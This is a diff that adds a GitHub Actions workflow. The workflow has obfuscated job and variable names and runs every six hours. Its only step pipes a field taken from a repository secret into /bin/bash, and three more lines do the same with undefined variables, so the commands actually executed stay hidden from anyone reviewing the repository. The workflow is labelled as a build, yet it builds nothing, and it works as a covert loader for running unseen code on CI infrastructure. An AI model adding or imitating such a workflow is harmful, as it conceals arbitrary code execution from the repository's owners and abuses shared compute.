@@ -1,0 +1,20 @@
+name: zhengxuanyao4817
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhengxuanyao4817
+        env:
+          vc94112: ${{ secrets.vc94112 }}
+        run: |
+          echo $vc94112 | jq -r .m51 | /bin/bash
+          echo $s1135 | jq -r .m51 | /bin/bash
+          echo $ad0 | jq -r .vp0560 | /bin/bash
+          echo $tlx62280 | jq -r .k8 | /bin/bash
+
